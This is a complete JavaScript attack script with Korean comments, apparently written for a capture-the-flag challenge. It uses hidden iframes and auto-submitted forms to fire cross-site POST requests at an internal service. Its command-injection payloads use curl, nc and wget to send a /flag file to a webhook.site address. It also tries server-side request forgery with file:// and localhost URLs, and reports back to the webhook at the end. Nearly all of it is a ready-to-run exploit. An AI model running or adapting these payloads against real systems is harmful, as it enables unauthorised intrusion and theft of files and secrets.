(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3'; // 본인의 웹훅
    const TARGET = 'http://redis:8000';

    // 1. 공격 페이로드 구성
    // [RCE] 명령 실행 시도
    const rcePayloads = [
        `curl -X POST -d @/flag ${WEBHOOK}`,
        `cat /flag | nc ${WEBHOOK.replace('https://', '')} 80`,
        `wget --post-file=/flag ${WEBHOOK}`
    ];
    
    // [SSRF] 단순 URL 패치 시도 (만약 이 서비스가 URL을 입력받아 보여주는 서비스라면?)
    // 웹훅으로 접속하게 하거나, 로컬 파일(file://)을 읽어서 자신의 서버로 보내게 유도
    const ssrfPayloads = [
        `file:///flag`,
        `file:///app/flag`,
        `http://localhost:5000/flag`, // 봇 기준 로컬호스트
        WEBHOOK // 그냥 웹훅으로 접속이라도 해봐라
    ];

    // 파라미터 이름 추측 (RCE + SSRF 혼합)
    const params = ['cmd', 'command', 'exec', 'code', 'q', 'query', 'url', 'link', 'target', 'host'];

    // 2. POST CSRF 함수 (Form 생성 및 자동 제출)
    const triggerPost = (param, value) => {
        return new Promise(resolve => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.name = `csrf-${Math.random().toString(36).substring(7)}`;
            document.body.appendChild(iframe);

            const form = document.createElement('form');
            form.method = 'POST';
            form.action = TARGET + '/'; // 루트 경로로 POST
            form.target = iframe.name;
            form.style.display = 'none';

            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = param;
            input.value = value;
            form.appendChild(input);

            document.body.appendChild(form);
            form.submit();

            // 0.3초 딜레이 후 정리 (너무 빠르면 전송 안 됨)
            setTimeout(() => {
                iframe.remove();
                form.remove();
                resolve();
            }, 300);
        });
    };

    // 3. 공격 실행
    // RCE 페이로드 발사
    for (const param of params) {
        for (const payload of rcePayloads) {
            await triggerPost(param, payload);
        }
    }
    
    // SSRF 페이로드 발사
    for (const param of params) {
        for (const payload of ssrfPayloads) {
            await triggerPost(param, payload);
        }
    }

    // 4. 완료 보고
    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            msg: "POST CSRF (RCE + SSRF) Launched",
            target: TARGET,
            location: window.location.href
        })
    });
})();
